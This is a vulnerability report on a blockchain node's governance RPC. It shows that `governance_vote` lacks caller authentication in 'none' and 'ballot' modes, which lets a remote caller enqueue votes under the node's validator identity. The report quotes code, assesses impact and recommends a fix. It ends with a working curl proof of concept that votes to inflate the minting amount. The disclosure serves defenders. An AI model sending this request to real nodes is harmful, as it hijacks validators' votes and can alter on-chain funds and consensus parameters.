### Title
Unauthenticated Remote RPC Caller Can Enqueue Governance Votes Under Node's Validator Identity in `none`/`ballot` Mode — (`kaiax/gov/headergov/impl/api.go`)

---

### Summary

`headerGovAPI.Vote` is registered as a `Public: true` RPC method under the `governance` namespace. For `GovernanceMode == "none"` or `"ballot"`, the function contains **no caller authentication**. Any remote RPC caller who can reach the endpoint can enqueue an attacker-chosen governance vote that will be embedded in the next block the node proposes, under the node's own validator address.

---

### Finding Description

The `Vote` function in `api.go` performs only one permission check:

```go
// kaiax/gov/headergov/impl/api.go:61-63
if gMode == "single" && voter != gp.GoverningNode {
    return "", ErrVotePermissionDenied
}
``` [1](#0-0) 

This guard fires **only** when `gMode == "single"`. For `"none"` and `"ballot"` modes, execution falls through unconditionally to:

```go
// kaiax/gov/headergov/impl/api.go:81
api.h.PushMyVotes(vote)
``` [2](#0-1) 

The voter identity is always the **node's own address**, not the caller's:

```go
// kaiax/gov/headergov/impl/api.go:55
voter = api.h.nodeAddress
``` [3](#0-2) 

`PushMyVotes` appends the vote to the in-memory `myVotes` queue with no further checks:

```go
// kaiax/gov/headergov/impl/init.go:183-188
func (h *headerGovModule) PushMyVotes(vote headergov.VoteData) {
    h.mu.Lock()
    defer h.mu.Unlock()
    h.myVotes = append(h.myVotes, vote)
}
``` [4](#0-3) 

The API is registered as `Public: true` on the `governance` namespace, making it available on the HTTP/WS RPC endpoint when that namespace is enabled:

```go
// kaiax/gov/headergov/impl/api.go:13-22
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{{
        Namespace: "governance",
        Version:   "1.0",
        Service:   NewHeaderGovAPI(h),
        Public:    true,
    }}
}
``` [5](#0-4) 

When the node next proposes a block, `header.go` reads from `myVotes` and embeds the attacker-supplied vote bytes directly into the block header's `Vote` field. [6](#0-5) 

---

### Impact Explanation

An attacker who can reach the node's public RPC port can:

1. Call `governance_vote("reward.mintingamount", <MaxUint256>)` (or any other governance parameter).
2. The vote is enqueued under the **node's validator address** without the operator's knowledge or consent.
3. The vote is embedded in the next block the node proposes, becoming on-chain state.
4. In `ballot` mode, if enough validators are similarly tricked (or the council is small), the vote can reach majority and change live governance parameters — including minting amounts, base fee bounds, or committee size — constituting unauthorized governance privilege escalation affecting chain-managed funds and consensus parameters. [7](#0-6) 

---

### Likelihood Explanation

- The `governance` namespace must be included in `--http.api` / `--ws.api` for the attack to work over HTTP/WS. Validator nodes that expose governance RPC (a common operational requirement) are directly vulnerable.
- No credentials, keys, or special network position are required — a single unauthenticated JSON-RPC call suffices.
- The `ballot` mode is the standard governance mode for multi-validator networks, making this the common-case scenario.

---

### Recommendation

Add caller authentication to `Vote` for all governance modes, not just `"single"`. The simplest fix is to restrict `Vote` to the IPC endpoint (set `Public: false`) or add an explicit check that the RPC caller is the local node operator (e.g., via an authenticated namespace or a local-only transport check). At minimum, the `"ballot"` branch must verify the caller is authorized before calling `PushMyVotes`.

---

### Proof of Concept

```bash
# Node is a council member, GovernanceMode = "ballot", governance namespace exposed on HTTP
curl -X POST http://<node-rpc>:8551 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"governance_vote","params":["reward.mintingamount","999999999999999999999999"],"id":1}'

# Expected (vulnerable): {"result":"(kaiax) Your vote is prepared..."}
# The vote is now in myVotes and will be embedded in the next proposed block header
# under the node's validator address without operator consent.
```
